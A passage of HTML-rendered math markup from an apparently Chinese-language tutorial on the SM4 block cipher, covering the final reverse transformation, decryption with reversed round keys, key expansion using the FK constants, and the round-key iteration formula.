style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></span></p><h2 id="一次反序变换">一次反序变换</h2><p>第二步为一次简单的反序变换,将最后生成的4字(X32,X33,X34,X35)进行反序,即得到最终的密文(Y0,Y1,Y2,Y3)=(X35,X34,X33,X32)</p><h1 id="解密过程">解密过程</h1><p>解密过程与加密过程完全相同,也需要32次迭代和1次反序变换,只不过在迭代时要将,轮密钥逆序使用.</p><h1 id="密钥扩展和轮函数f">密钥扩展和轮函数F</h1><h2 id="密钥扩展">密钥扩展</h2><p>SM4的原始密钥为128位(4字),根据原始密钥扩展为32个1字子密钥.</p><h3 id="与系统参数异或-初始化密钥">与系统参数异或-初始化密钥</h3><p>将原始密钥的每个字<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><msub><mi>K</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">MK_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>与系统参数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><msub><mi>K</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">FK_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>异或,得到4个新字<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>K</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(K_0,K_1,K_2,K_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>,即:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>K</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>M</mi><msub><mi>K</mi><mn>0</mn></msub><mo>⊕</mo><mi>F</mi><msub><mi>K</mi><mn>0</mn></msub><mo separator="true">,</mo><mi>M</mi><msub><mi>K</mi><mn>1</mn></msub><mo>⊕</mo><mi>F</mi><msub><mi>K</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>M</mi><msub><mi>K</mi><mn>2</mn></msub><mo>⊕</mo><mi>F</mi><msub><mi>K</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>M</mi><msub><mi>K</mi><mn>3</mn></msub><mo>⊕</mo><mi>F</mi><msub><mi>K</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(K_0,K_1,K_2,K_3) = (MK_0 \oplus FK_0,MK_1 \oplus FK_1,MK_2 \oplus FK_2,MK_3 \oplus FK_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>FK为: 0xA3B1BAC6,0x56AA3350,0x677D9197,0xB27022DC</p><h3 id="轮迭代生成轮密钥">轮迭代生成轮密钥</h3><p>根据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>K</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>K</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(K_0,K_1,K_2,K_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>进行32轮迭代,生成32个轮密钥.公式如下:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><msub><mi>k</mi><mi>i</mi></msub><mo>=</mo><msub><mi>K</mi><mrow><mi>i</mi><mo>+</mo><mn>4</mn></mrow></msub><mo>=</mo><msub><mi>K</mi><mi>i</mi></msub><mo>⊕</mo><msup><mi>T</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo stretchy="false">(</mo><msub><mi>K</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>⊕</mo><msub><mi>K</mi><mrow><mi>i</mi><mo>+</mo><mn>2</mn></mrow></msub><mo>⊕</mo><msub><mi>K</mi><mrow><mi>i</mi><mo>+</mo><mn>3</mn></mrow></msub><mo>⊕</mo><mi>C</mi><msub><mi>K</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mtext> </mtext><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mn>31</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">rk_i = K_{i+4} = K_i \oplus T^{&#x27;}(K_{i+1} \oplus K_{i+2} \oplus K_{i+3} \oplus CK_i)\ (i = 0,1,2,...,31)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.24248em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.99248em;"><span style="top:-2.99248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><h4 id="合成置换t">合成置换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>T</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup></mrow><annotation encoding="application/x-tex">T^{&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></h4><p>该置换与加密过程的合成置换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 